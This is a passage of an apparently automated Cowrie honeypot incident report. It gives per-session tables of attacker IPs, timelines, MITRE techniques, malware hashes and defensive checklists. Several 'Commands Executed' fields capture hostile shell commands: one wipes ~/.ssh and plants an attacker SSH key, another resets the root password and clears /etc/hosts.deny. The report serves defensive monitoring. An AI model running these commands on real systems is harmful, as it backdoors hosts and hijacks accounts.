| `2026-04-13 15:58:12` | `cowrie.command.input` |
| `2026-04-13 15:58:12` | `cowrie.command.failed` |
| `2026-04-13 15:58:12` | `cowrie.log.closed` |
| `2026-04-13 15:58:12` | `cowrie.session.params` |
| `2026-04-13 15:58:12` | `cowrie.command.input` |
| `2026-04-13 15:58:12` | `cowrie.session.file_download` |
| `2026-04-13 15:58:12` | `cowrie.log.closed` |
| `2026-04-13 15:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3872fe3656e

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 15:58 |
| **Last Seen** | 2026-04-13 15:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:58:14` | `cowrie.session.connect` |
| `2026-04-13 15:58:14` | `cowrie.client.version` |
| `2026-04-13 15:58:14` | `cowrie.client.kex` |
| `2026-04-13 15:58:15` | `cowrie.login.success` |
| `2026-04-13 15:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffc05ee25f13

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:58 |
| **Last Seen** | 2026-04-13 15:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:58:22` | `cowrie.session.connect` |
| `2026-04-13 15:58:22` | `cowrie.client.version` |
| `2026-04-13 15:58:22` | `cowrie.client.kex` |
| `2026-04-13 15:58:23` | `cowrie.login.success` |
| `2026-04-13 15:58:23` | `cowrie.session.params` |
| `2026-04-13 15:58:23` | `cowrie.command.input` |
| `2026-04-13 15:58:23` | `cowrie.command.failed` |
| `2026-04-13 15:58:24` | `cowrie.log.closed` |
| `2026-04-13 15:58:24` | `cowrie.session.params` |
| `2026-04-13 15:58:24` | `cowrie.command.input` |
| `2026-04-13 15:58:24` | `cowrie.session.file_download` |
| `2026-04-13 15:58:24` | `cowrie.log.closed` |
| `2026-04-13 15:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37977f3b7a7

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:58 |
| **Last Seen** | 2026-04-13 15:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:58:26` | `cowrie.session.connect` |
| `2026-04-13 15:58:26` | `cowrie.client.version` |
| `2026-04-13 15:58:26` | `cowrie.client.kex` |
| `2026-04-13 15:58:27` | `cowrie.login.success` |
| `2026-04-13 15:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0a08df9d28e

| Field | Detail |
|---|---|
| **Source IP** | `118.196.34[.]237` |
| **First Seen** | 2026-04-13 15:58 |
| **Last Seen** | 2026-04-13 15:59 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pv0ts5FCa6Hi"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:58:46` | `cowrie.session.connect` |
| `2026-04-13 15:58:46` | `cowrie.client.version` |
| `2026-04-13 15:58:46` | `cowrie.client.kex` |
| `2026-04-13 15:58:47` | `cowrie.login.success` |
| `2026-04-13 15:58:47` | `cowrie.session.params` |
| `2026-04-13 15:58:47` | `cowrie.command.input` |
| `2026-04-13 15:58:47` | `cowrie.command.failed` |
| `2026-04-13 15:58:47` | `cowrie.log.closed` |
| `2026-04-13 15:58:48` | `cowrie.session.params` |
| `2026-04-13 15:58:48` | `cowrie.command.input` |
| `2026-04-13 15:58:48` | `cowrie.session.file_download` |
| `2026-04-13 15:58:48` | `cowrie.log.closed` |
| `2026-04-13 15:58:57` | `cowrie.session.params` |
| `2026-04-13 15:58:57` | `cowrie.command.input` |
| `2026-04-13 15:58:57` | `cowrie.log.closed` |
| `2026-04-13 15:58:57` | `cowrie.session.params` |
| `2026-04-13 15:58:57` | `cowrie.command.input` |
| `2026-04-13 15:58:57` | `cowrie.log.closed` |
| `2026-04-13 15:58:57` | `cowrie.session.params` |
| `2026-04-13 15:58:57` | `cowrie.command.input` |
| `2026-04-13 15:58:58` | `cowrie.session.file_download` |
| `2026-04-13 15:58:58` | `cowrie.log.closed` |
| `2026-04-13 15:58:58` | `cowrie.session.params` |
| `2026-04-13 15:58:58` | `cowrie.command.input` |
| `2026-04-13 15:58:58` | `cowrie.log.closed` |
| `2026-04-13 15:58:58` | `cowrie.session.params` |
| `2026-04-13 15:58:58` | `cowrie.command.input` |
| `2026-04-13 15:58:59` | `cowrie.log.closed` |
| `2026-04-13 15:58:59` | `cowrie.session.params` |
| `2026-04-13 15:58:59` | `cowrie.command.input` |
| `2026-04-13 15:58:59` | `cowrie.command.input` |
| `2026-04-13 15:58:59` | `cowrie.log.closed` |
| `2026-04-13 15:58:59` | `cowrie.session.params` |
| `2026-04-13 15:58:59` | `cowrie.command.input` |
| `2026-04-13 15:58:59` | `cowrie.log.closed` |
| `2026-04-13 15:59:00` | `cowrie.session.params` |
| `2026-04-13 15:59:00` | `cowrie.command.input` |
| `2026-04-13 15:59:00` | `cowrie.log.closed` |
| `2026-04-13 15:59:00` | `cowrie.session.params` |
| `2026-04-13 15:59:00` | `cowrie.command.input` |
| `2026-04-13 15:59:00` | `cowrie.log.closed` |
| `2026-04-13 15:59:01` | `cowrie.session.params` |
| `2026-04-13 15:59:01` | `cowrie.command.input` |
| `2026-04-13 15:59:01` | `cowrie.log.closed` |
| `2026-04-13 15:59:01` | `cowrie.session.params` |
| `2026-04-13 15:59:01` | `cowrie.command.input` |
| `2026-04-13 15:59:01` | `cowrie.log.closed` |
| `2026-04-13 15:59:01` | `cowrie.session.params` |
| `2026-04-13 15:59:01` | `cowrie.command.input` |
| `2026-04-13 15:59:02` | `cowrie.log.closed` |
| `2026-04-13 15:59:02` | `cowrie.session.params` |
| `2026-04-13 15:59:02` | `cowrie.command.input` |
| `2026-04-13 15:59:02` | `cowrie.log.closed` |
| `2026-04-13 15:59:02` | `cowrie.session.params` |
| `2026-04-13 15:59:02` | `cowrie.command.input` |
| `2026-04-13 15:59:03` | `cowrie.log.closed` |
| `2026-04-13 15:59:03` | `cowrie.session.params` |
| `2026-04-13 15:59:03` | `cowrie.command.input` |
| `2026-04-13 15:59:03` | `cowrie.log.closed` |
| `2026-04-13 15:59:03` | `cowrie.session.params` |
| `2026-04-13 15:59:03` | `cowrie.command.input` |
| `2026-04-13 15:59:03` | `cowrie.log.closed` |
| `2026-04-13 15:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.34[.]237` to AbuseIPDB if not already reported
- [ ] Block `118.196.34[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1bfa45c1418

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 16:00 |
| **Last Seen** | 2026-04-13 16:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:00:10` | `cowrie.session.connect` |
| `2026-04-13 16:00:10` | `cowrie.client.version` |
| `2026-04-13 16:00:10` | `cowrie.client.kex` |
| `2026-04-13 16:00:11` | `cowrie.login.success` |
| `2026-04-13 16:00:11` | `cowrie.session.params` |
| `2026-04-13 16:00:11` | `cowrie.command.input` |
| `2026-04-13 16:00:11` | `cowrie.command.failed` |
| `2026-04-13 16:00:11` | `cowrie.log.closed` |
| `2026-04-13 16:00:11` | `cowrie.session.params` |
| `2026-04-13 16:00:11` | `cowrie.command.input` |
| `2026-04-13 16:00:11` | `cowrie.session.file_download` |
| `2026-04-13 16:00:11` | `cowrie.log.closed` |
| `2026-04-13 16:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9be04c124594

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 16:00 |
| **Last Seen** | 2026-04-13 16:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:00:13` | `cowrie.session.connect` |
| `2026-04-13 16:00:13` | `cowrie.client.version` |
| `2026-04-13 16:00:13` | `cowrie.client.kex` |
| `2026-04-13 16:00:14` | `cowrie.login.success` |
| `2026-04-13 16:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6656cd7f0bcf

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 16:04 |
| **Last Seen** | 2026-04-13 16:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:04:00` | `cowrie.session.connect` |
| `2026-04-13 16:04:00` | `cowrie.client.version` |
| `2026-04-13 16:04:01` | `cowrie.client.kex` |
| `2026-04-13 16:04:01` | `cowrie.login.success` |
| `2026-04-13 16:04:01` | `cowrie.session.params` |
| `2026-04-13 16:04:01` | `cowrie.command.input` |
| `2026-04-13 16:04:01` | `cowrie.command.failed` |
| `2026-04-13 16:04:01` | `cowrie.log.closed` |
| `2026-04-13 16:04:02` | `cowrie.session.params` |
| `2026-04-13 16:04:02` | `cowrie.command.input` |
| `2026-04-13 16:04:02` | `cowrie.session.file_download` |
| `2026-04-13 16:04:02` | `cowrie.log.closed` |
| `2026-04-13 16:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94aa57debb57

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 16:04 |
| **Last Seen** | 2026-04-13 16:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:04:03` | `cowrie.session.connect` |
| `2026-04-13 16:04:03` | `cowrie.client.version` |
| `2026-04-13 16:04:04` | `cowrie.client.kex` |
| `2026-04-13 16:04:04` | `cowrie.login.success` |
| `2026-04-13 16:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ccdd0988ef3

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 16:09 |
| **Last Seen** | 2026-04-13 16:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:09:36` | `cowrie.session.connect` |
| `2026-04-13 16:09:36` | `cowrie.client.version` |
| `2026-04-13 16:09:36` | `cowrie.client.kex` |
| `2026-04-13 16:09:37` | `cowrie.login.success` |
| `2026-04-13 16:09:37` | `cowrie.session.params` |
| `2026-04-13 16:09:37` | `cowrie.command.input` |
| `2026-04-13 16:09:37` | `cowrie.command.failed` |
| `2026-04-13 16:09:37` | `cowrie.log.closed` |
| `2026-04-13 16:09:38` | `cowrie.session.params` |
| `2026-04-13 16:09:38` | `cowrie.command.input` |
| `2026-04-13 16:09:38` | `cowrie.session.file_download` |
| `2026-04-13 16:09:38` | `cowrie.log.closed` |
| `2026-04-13 16:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e81539a5fb5b

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 16:09 |
| **Last Seen** | 2026-04-13 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:09:40` | `cowrie.session.connect` |
| `2026-04-13 16:09:40` | `cowrie.client.version` |
| `2026-04-13 16:09:40` | `cowrie.client.kex` |
| `2026-04-13 16:09:41` | `cowrie.login.success` |
| `2026-04-13 16:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aafe1594d78

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 16:11 |
| **Last Seen** | 2026-04-13 16:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:11:23` | `cowrie.session.connect` |
| `2026-04-13 16:11:23` | `cowrie.client.version` |
| `2026-04-13 16:11:23` | `cowrie.client.kex` |
| `2026-04-13 16:11:23` | `cowrie.login.success` |
| `2026-04-13 16:11:24` | `cowrie.session.params` |
| `2026-04-13 16:11:24` | `cowrie.command.input` |
| `2026-04-13 16:11:24` | `cowrie.command.failed` |
| `2026-04-13 16:11:24` | `cowrie.log.closed` |
| `2026-04-13 16:11:24` | `cowrie.session.params` |
| `2026-04-13 16:11:24` | `cowrie.command.input` |
| `2026-04-13 16:11:24` | `cowrie.session.file_download` |
| `2026-04-13 16:11:24` | `cowrie.log.closed` |
| `2026-04-13 16:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe790dc17c5e

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 16:11 |
| **Last Seen** | 2026-04-13 16:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:11:26` | `cowrie.session.connect` |
| `2026-04-13 16:11:26` | `cowrie.client.version` |
| `2026-04-13 16:11:26` | `cowrie.client.kex` |
| `2026-04-13 16:11:26` | `cowrie.login.success` |
| `2026-04-13 16:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e581206ddd7

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 16:13 |
| **Last Seen** | 2026-04-13 16:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:13:02` | `cowrie.session.connect` |
| `2026-04-13 16:13:02` | `cowrie.client.version` |
| `2026-04-13 16:13:02` | `cowrie.client.kex` |
| `2026-04-13 16:13:03` | `cowrie.login.success` |
| `2026-04-13 16:13:03` | `cowrie.session.params` |
| `2026-04-13 16:13:03` | `cowrie.command.input` |
| `2026-04-13 16:13:03` | `cowrie.command.failed` |
| `2026-04-13 16:13:04` | `cowrie.log.closed` |
| `2026-04-13 16:13:04` | `cowrie.session.params` |
| `2026-04-13 16:13:04` | `cowrie.command.input` |
| `2026-04-13 16:13:04` | `cowrie.session.file_download` |
| `2026-04-13 16:13:04` | `cowrie.log.closed` |
| `2026-04-13 16:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42fded2e2f69

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 16:13 |
| **Last Seen** | 2026-04-13 16:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:13:06` | `cowrie.session.connect` |
| `2026-04-13 16:13:06` | `cowrie.client.version` |
| `2026-04-13 16:13:06` | `cowrie.client.kex` |
| `2026-04-13 16:13:07` | `cowrie.login.success` |
| `2026-04-13 16:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03e77342a1b

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 16:13 |
| **Last Seen** | 2026-04-13 16:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
